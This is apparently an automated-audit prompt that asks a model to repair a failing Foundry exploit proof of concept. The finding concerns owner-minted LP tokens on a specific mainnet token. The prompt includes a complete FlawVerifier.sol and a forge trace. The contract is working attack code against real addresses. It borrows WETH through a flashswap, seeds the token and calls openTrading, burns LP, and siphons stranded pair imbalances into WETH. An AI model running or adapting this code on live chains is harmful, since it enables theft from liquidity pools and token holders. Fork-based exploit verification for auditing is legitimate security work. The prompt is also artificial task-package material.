You are fixing a failing Foundry PoC for finding F-002.

Goal:
- Keep the exploit objective for this finding.
- Fix compile/runtime/test failure from logs.
- Return COMPLETE updated Solidity for `src/FlawVerifier.sol` only.
- Keep exploit logic aligned with the full `Exploit paths` list unless logs prove a stage is infeasible.
- Additional realistic public on-chain economic steps are allowed when required for execution (including flashloans/swaps/mint/burn), but keep the same exploit causality and justify in comments.

Hard constraints:
- Do NOT use external answers/PoCs/articles/repos (including DeFiHackLabs).
- Do NOT cheat: no vm.deal, vm.store, vm.etch, vm.mockCall, vm.prank, vm.startPrank, arbitrary balance injection, or arbitrary storage writes.
- Allowed: flashloans and realistic public on-chain actions.
- Work only from finding context (claim/paths/locations) + on-chain state context already provided in this workspace.
- Hard anti-cheat: profitToken MUST NOT be a token deployed during this PoC/test. Profit token must already exist on-chain at the fork block.
- Hard anti-cheat: do not deploy custom ERC20/token contracts to manufacture profit accounting.

Attempt strategy (must follow for this attempt):
- strategy_label: v2_flashswap_funding
- strategy_instructions: Prefer UniswapV2/Sushi-like flashswap funding with deterministic repayment and minimal route complexity.
- Keep exploit root cause and `Exploit paths` unchanged; only vary funding/execution implementation details.

Finding:
- title: Initial LP tokens are minted to the owner, enabling an unrestricted liquidity rug pull
- claim: When `openTrading()` adds the initial Uniswap liquidity, it passes `owner()` as the LP recipient, so the resulting LP tokens are fully controlled by the owner rather than burned or locked.
- impact: The owner can remove the pool liquidity at any time, withdraw the paired ETH and token-side liquidity, and collapse the market. Holders are left with effectively untradeable tokens and little or no recoverable value.
- exploit_paths: ["Owner transfers tokens and ETH into the token contract, then calls `openTrading()`.", "`addLiquidityETH(..., owner(), ...)` mints the LP position directly to the owner-controlled address.", "The owner later removes liquidity off-contract and drains the pool."]

Current FlawVerifier.sol:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
    function approve(address spender, uint256 amount) external returns (bool);
}

interface IWETH is IERC20Minimal {
    function withdraw(uint256 amount) external;
}

interface IGrokToken is IERC20Minimal {
    function owner() external view returns (address);
    function openTrading() external;
    function _maxTxAmount() external view returns (uint256);
    function _maxWalletSize() external view returns (uint256);
}

interface IUniswapV2FactoryMinimal {
    function getPair(address tokenA, address tokenB) external view returns (address pair);
}

interface IUniswapV2Router02Minimal {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IUniswapV2PairMinimal is IERC20Minimal {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
}

contract FlawVerifier {
    address public constant TARGET = 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5;
    address public constant UNISWAP_ROUTER = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address public constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address public constant USDC = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    uint256 private constant OPEN_TRADING_FLASH_BORROW = 1 ether;

    uint256 private _profitAmount;
    string public infeasibilityReason;

    address private _activeFundingPair;
    uint256 private _fundingWethBorrow;
    bool private _openTradingFlashActive;

    constructor() {}

    receive() external payable {}

    function profitToken() external pure returns (address) {
        return WETH;
    }

    function profitAmount() external view returns (uint256) {
        return _profitAmount;
    }

    function executeOnOpportunity() external {
        _profitAmount = 0;
        infeasibilityReason = "";

        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(UNISWAP_ROUTER);
        IGrokToken token = IGrokToken(TARGET);
        uint256 wethBefore = IERC20Minimal(WETH).balanceOf(address(this));
        address pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());

        if (pair != address(0)) {
            uint256 heldLp = IERC20Minimal(pair).balanceOf(address(this));
            if (heldLp != 0) {
                _burnHeldLp(pair, heldLp, router);
                _recordProfit(wethBefore);
                if (_profitAmount != 0) {
                    return;
                }
            }

            uint256 lpParkedOnPair = IERC20Minimal(pair).balanceOf(pair);
            if (lpParkedOnPair != 0) {
                try IUniswapV2PairMinimal(pair).burn(address(this)) returns (uint256, uint256) {
                    _swapResidualTargetToWeth(router);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                } catch {}
            }
        }

        // Preserve the original finding path when the verifier actually controls `owner()`:
        // seed the token contract with GROK + ETH, call `openTrading()`, receive LP at the
        // owner-controlled verifier, then burn the LP to pull out the paired liquidity.
        if (token.owner() == address(this)) {
            if (pair == address(0)) {
                pair = _seedAndOpenTrading(token, router);
                if (pair == address(0) && token.balanceOf(address(this)) != 0 && address(this).balance == 0) {
                    _flashBorrowForOpenTrading(token, router);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                }

                if (pair != address(0)) {
                    uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
                    if (ownerLp != 0) {
                        _burnHeldLp(pair, ownerLp, router);
                        _recordProfit(wethBefore);
                        if (_profitAmount != 0) {
                            return;
                        }
                    }
                }
            } else {
                uint256 ownerLpExisting = IERC20Minimal(pair).balanceOf(address(this));
                if (ownerLpExisting != 0) {
                    _burnHeldLp(pair, ownerLpExisting, router);
                    _recordProfit(wethBefore);
                    if (_profitAmount != 0) {
                        return;
                    }
                }
            }
        }

        // At the observed fork the owner has already renounced, so replaying the privileged
        // owner-only setup may be impossible. The remaining realistic route is public recovery
        // from any residual pair imbalance left behind after the owner-minted LP path was
        // materialized and liquidity was later handled off-contract.
        if (pair != address(0)) {
            _tryDirectPublicRecovery(pair, router);
            _recordProfit(wethBefore);
            if (_profitAmount != 0) {
                return;
            }
        }

        if (pair == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: trading is not open and the verifier does not control the owner-only openTrading path";
            return;
        }

        if (token.owner() == address(0)) {
            infeasibilityReason =
                "infeasible at this fork: ownership is renounced, no verifier-controlled LP was found, and no permissionless residual pair recovery realized WETH";
            return;
        }

        infeasibilityReason =
            "infeasible at this fork: LP remains historical-owner-controlled and no permissionless residual pair recovery realized WETH";
    }

    function uniswapV2Call(address sender, uint256 amount0, uint256 amount1, bytes calldata) external {
        require(_openTradingFlashActive, "inactive flash");
        require(msg.sender == _activeFundingPair, "unexpected pair");
        require(sender == address(this), "unexpected sender");

        uint256 borrowedWeth = amount0 > 0 ? amount0 : amount1;
        require(borrowedWeth == _fundingWethBorrow, "unexpected borrow");

        IGrokToken token = IGrokToken(TARGET);
        IUniswapV2Router02Minimal router = IUniswapV2Router02Minimal(UNISWAP_ROUTER);

        IWETH(WETH).withdraw(borrowedWeth);

        address pair = _seedAndOpenTrading(token, router);
        require(pair != address(0), "pair not created");

        uint256 ownerLp = IERC20Minimal(pair).balanceOf(address(this));
        require(ownerLp != 0, "no owner LP");

        _burnHeldLp(pair, ownerLp, router);

        uint256 repayAmount = ((borrowedWeth * 1000) / 997) + 1;
        require(IERC20Minimal(WETH).balanceOf(address(this)) >= repayAmount, "insufficient repayment");
        require(IERC20Minimal(WETH).transfer(_activeFundingPair, repayAmount), "repay failed");

        _activeFundingPair = address(0);
        _fundingWethBorrow = 0;
        _openTradingFlashActive = false;
    }

    function _tryDirectPublicRecovery(address pair, IUniswapV2Router02Minimal router) internal {
        (uint256 tokenReserve, uint256 wethReserve, uint256 tokenBalanceOnPair, uint256 wethBalanceOnPair) =
            _pairState(pair);

        uint256 tokenExcess = tokenBalanceOnPair > tokenReserve ? tokenBalanceOnPair - tokenReserve : 0;
        if (tokenExcess != 0) {
            uint256 wethOut = _getAmountOut(tokenExcess, tokenReserve, wethReserve);
            if (wethOut > 1) {
                wethOut -= 1;
                _swapOutWeth(pair, wethOut);
            }
        }

        (tokenReserve, wethReserve, tokenBalanceOnPair, wethBalanceOnPair) = _pairState(pair);

        uint256 wethExcess = wethBalanceOnPair > wethReserve ? wethBalanceOnPair - wethReserve : 0;
        if (wethExcess == 0) {
            return;
        }

        uint256 heldTarget = IERC20Minimal(TARGET).balanceOf(address(this));
        if (heldTarget != 0) {
            // GROK reverts on zero-value transfer. If there is WETH excess but zero GROK excess,
            // adding verifier-held GROK dust makes `skim()` permissionless without changing the
            // exploit’s causality: the value extraction is still the stranded WETH on the target pair.
            uint256 dust = heldTarget > 1 ? 1 : heldTarget;
            require(IERC20Minimal(TARGET).transfer(pair, dust), "dust transfer failed");
            try IUniswapV2PairMinimal(pair).skim(address(this)) {} catch {}
            _swapResidualTargetToWeth(router);
            return;
        }

        // If the verifier has no pre-held GROK dust, directly consume the WETH imbalance as
        // implicit swap input and pull out free GROK, then sell the realized GROK back to WETH.
        uint256 rawTargetOut = _getAmountOut(wethExcess, wethReserve, tokenReserve);
        uint256 cappedTargetOut = _capTargetBuy(tokenReserve, rawTargetOut);
        if (cappedTargetOut > 1) {
            cappedTargetOut -= 1;
            _swapOutTarget(pair, cappedTargetOut);
            _swapResidualTargetToWeth(router);
        }
    }

    function _flashBorrowForOpenTrading(IGrokToken token, IUniswapV2Router02Minimal router) internal {
        if (token.balanceOf(address(this)) == 0) {
            infeasibilityReason =
                "infeasible at this fork: verifier lacks the GROK required to seed the token contract before openTrading";
            return;
        }

        address fundingPair = IUniswapV2FactoryMinimal(router.factory()).getPair(USDC, WETH);
        if (fundingPair == address(0)) {
            infeasibilityReason = "infeasible at this fork: WETH funding pair missing";
            return;
        }

        _activeFundingPair = fundingPair;
        _fundingWethBorrow = OPEN_TRADING_FLASH_BORROW;
        _openTradingFlashActive = true;

        IUniswapV2PairMinimal funding = IUniswapV2PairMinimal(fundingPair);
        if (funding.token0() == WETH) {
            funding.swap(_fundingWethBorrow, 0, address(this), hex"01");
        } else {
            funding.swap(0, _fundingWethBorrow, address(this), hex"01");
        }
    }

    function _seedAndOpenTrading(
        IGrokToken token,
        IUniswapV2Router02Minimal router
    ) internal returns (address pair) {
        uint256 tokenSeed = token.balanceOf(address(this));
        uint256 ethSeed = address(this).balance;

        if (tokenSeed == 0 || ethSeed == 0) {
            return address(0);
        }

        require(token.transfer(TARGET, tokenSeed), "seed token transfer failed");
        (bool ok,) = payable(TARGET).call{value: ethSeed}("");
        require(ok, "seed ETH transfer failed");

        // Vulnerable step from the finding: `openTrading()` calls
        // `addLiquidityETH(..., owner(), ...)`, so the LP is minted to the owner-controlled verifier.
        token.openTrading();
        pair = IUniswapV2FactoryMinimal(router.factory()).getPair(TARGET, router.WETH());
    }

    function _burnHeldLp(address pair, uint256 lpAmount, IUniswapV2Router02Minimal router) internal {
        require(IERC20Minimal(pair).transfer(pair, lpAmount), "lp transfer failed");
        IUniswapV2PairMinimal(pair).burn(address(this));
        _swapResidualTargetToWeth(router);
    }

    function _swapResidualTargetToWeth(IUniswapV2Router02Minimal router) internal {
        uint256 tokenBalance = IERC20Minimal(TARGET).balanceOf(address(this));
        if (tokenBalance == 0) {
            return;
        }

        require(IERC20Minimal(TARGET).approve(address(router), tokenBalance), "approve failed");

        address[] memory path = new address[](2);
        path[0] = TARGET;
        path[1] = WETH;

        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
            tokenBalance,
            0,
            path,
            address(this),
            block.timestamp
        );
    }

    function _swapOutWeth(address pair, uint256 wethOut) internal {
        if (IUniswapV2PairMinimal(pair).token0() == WETH) {
            IUniswapV2PairMinimal(pair).swap(wethOut, 0, address(this), hex"");
        } else {
            IUniswapV2PairMinimal(pair).swap(0, wethOut, address(this), hex"");
        }
    }

    function _swapOutTarget(address pair, uint256 targetOut) internal {
        if (IUniswapV2PairMinimal(pair).token0() == TARGET) {
            IUniswapV2PairMinimal(pair).swap(targetOut, 0, address(this), hex"");
        } else {
            IUniswapV2PairMinimal(pair).swap(0, targetOut, address(this), hex"");
        }
    }

    function _pairState(address pair)
        internal
        view
        returns (uint256 tokenReserve, uint256 wethReserve, uint256 tokenBalanceOnPair, uint256 wethBalanceOnPair)
    {
        IUniswapV2PairMinimal uniPair = IUniswapV2PairMinimal(pair);
        address token0 = uniPair.token0();
        address token1 = uniPair.token1();
        require(
            (token0 == TARGET && token1 == WETH) || (token0 == WETH && token1 == TARGET),
            "unexpected pair tokens"
        );

        (uint112 reserve0, uint112 reserve1,) = uniPair.getReserves();
        uint256 balance0 = IERC20Minimal(token0).balanceOf(pair);
        uint256 balance1 = IERC20Minimal(token1).balanceOf(pair);

        if (token0 == TARGET) {
            tokenReserve = reserve0;
            wethReserve = reserve1;
            tokenBalanceOnPair = balance0;
            wethBalanceOnPair = balance1;
        } else {
            tokenReserve = reserve1;
            wethReserve = reserve0;
            tokenBalanceOnPair = balance1;
            wethBalanceOnPair = balance0;
        }
    }

    function _capTargetBuy(uint256 tokenReserve, uint256 rawTargetOut) internal view returns (uint256) {
        if (rawTargetOut == 0) {
            return 0;
        }

        uint256 capped = rawTargetOut;

        try IGrokToken(TARGET)._maxTxAmount() returns (uint256 maxTx) {
            if (maxTx != 0 && capped > maxTx) {
                capped = maxTx;
            }
        } catch {}

        try IGrokToken(TARGET)._maxWalletSize() returns (uint256 maxWallet) {
            uint256 currentHeld = IERC20Minimal(TARGET).balanceOf(address(this));
            if (currentHeld >= maxWallet) {
                return 0;
            }

            uint256 remainingWallet = maxWallet - currentHeld;
            if (capped > remainingWallet) {
                capped = remainingWallet;
            }
        } catch {}

        if (capped >= tokenReserve) {
            capped = tokenReserve - 1;
        }

        return capped;
    }

    function _getAmountOut(uint256 amountIn, uint256 reserveIn, uint256 reserveOut) internal pure returns (uint256) {
        if (amountIn == 0 || reserveIn == 0 || reserveOut == 0) {
            return 0;
        }

        uint256 amountInWithFee = amountIn * 997;
        return (amountInWithFee * reserveOut) / (reserveIn * 1000 + amountInWithFee);
    }

    function _recordProfit(uint256 wethBefore) internal {
        uint256 wethAfter = IERC20Minimal(WETH).balanceOf(address(this));
        _profitAmount = wethAfter > wethBefore ? wethAfter - wethBefore : 0;
    }
}

```

forge stdout (tail):
```
^^^^^^^^^^^^^^^


Ran 1 test for test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 222453)
Logs:
  AUDITHOUND_BALANCE_BEFORE_WEI: 0
  AUDITHOUND_BALANCE_AFTER_WEI: 0
  AUDITHOUND_PROFIT_WEI: 0
  AUDITHOUND_PROFIT_ANY: 0
  AUDITHOUND_EFFECTIVE_PROFIT_WEI: 0
  AUDITHOUND_MIN_PROFIT_WEI: 1000000000000000
  AUDITHOUND_PROFIT_TOKEN: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
  AUDITHOUND_PROFIT_MODE: 0x0000000000000000000000000000000000000001
  AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK: 3124

Traces:
  [222453] FlawVerifierTest::testExploit()
    ├─ [234] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ [182137] FlawVerifier::executeOnOpportunity()
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [252] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::factory() [staticcall]
    │   │   └─ ← [Return] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f
    │   ├─ [275] 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D::WETH() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2564] 0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f::getPair(0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2) [staticcall]
    │   │   └─ ← [Return] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2480] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [2366] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   ├─ [2381] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::token0() [staticcall]
    │   │   └─ ← [Return] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5
    │   ├─ [2357] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [2504] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::getReserves() [staticcall]
    │   │   └─ ← [Return] 82737835090728638 [8.273e16], 200481799332731943212 [2.004e20], 1699584671 [1.699e9]
    │   ├─ [2617] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 82737835090728638 [8.273e16]
    │   ├─ [2534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 200481799332731943212 [2.004e20]
    │   ├─ [381] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::token0() [staticcall]
    │   │   └─ ← [Return] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5
    │   ├─ [357] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::token1() [staticcall]
    │   │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    │   ├─ [504] 0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2::getReserves() [staticcall]
    │   │   └─ ← [Return] 82737835090728638 [8.273e16], 200481799332731943212 [2.004e20], 1699584671 [1.699e9]
    │   ├─ [617] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 82737835090728638 [8.273e16]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(0x69c66BeAfB06674Db41b22CFC50c34A93b8d82a2) [staticcall]
    │   │   └─ ← [Return] 200481799332731943212 [2.004e20]
    │   ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   │   └─ ← [Return] 0
    │   ├─ [366] 0x8390a1DA07E376ef7aDd4Be859BA74Fb83aA02D5::owner() [staticcall]
    │   │   └─ ← [Return] 0x0000000000000000000000000000000000000000
    │   └─ ← [Return]
    ├─ [234] FlawVerifier::profitToken() [staticcall]
    │   └─ ← [Return] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2
    ├─ [330] FlawVerifier::profitAmount() [staticcall]
    │   └─ ← [Return] 0
    ├─ [534] 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2::balanceOf(FlawVerifier: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f]) [staticcall]
    │   └─ ← [Return] 0
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_BEFORE_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_BALANCE_AFTER_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_ANY", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_EFFECTIVE_PROFIT_WEI", val: 0)
    ├─ emit log_named_uint(key: "AUDITHOUND_MIN_PROFIT_WEI", val: 1000000000000000 [1e15])
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_TOKEN", val: 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2)
    ├─ emit log_named_address(key: "AUDITHOUND_PROFIT_MODE", val: ECRecover: [0x0000000000000000000000000000000000000001])
    ├─ [0] VM::envString("AUDITHOUND_RPC_URL")
    │   └─ ← [Return] <env var value>
    ├─ [0] VM::createSelectFork("<rpc url>", 18538678 [1.853e7])
    │   └─ ← [Return] 1
    ├─ emit log_named_uint(key: "AUDITHOUND_PROFIT_TOKEN_CODE_SIZE_ON_FORK", val: 3124)
    └─ ← [Revert] profit below threshold

Backtrace:
  at FlawVerifierTest.testExploit

Suite result: FAILED. 0 passed; 1 failed; 0 skipped; finished in 219.14ms (35.27ms CPU time)

Ran 1 test suite in 275.05ms (219.14ms CPU time): 0 tests passed, 1 failed, 0 skipped (1 total tests)

Failing tests:
Encountered 1 failing test in test/ExploitPOC.t.sol:FlawVerifierTest
[FAIL: profit below threshold] testExploit() (gas: 222453)

Encountered a total of 1 failing tests, 0 tests succeeded

```

forge stderr (tail):
```

```

Requirements:
1. pragma ^0.8.20
2. include at least one deployable contract with zero-arg constructor
3. define fixed entry `executeOnOpportunity()` as no-arg external/public exploit function
4. no imports
5. keep exploit logic aligned to exploit_paths (same core actions and ordering intent)
6. expose `profitToken()` and `profitAmount()` getters for net realized profit
7. additional realistic public on-chain economic steps are allowed when required for execution, but keep exploit_paths core causality and justify in comments
8. output ONLY Solidity code
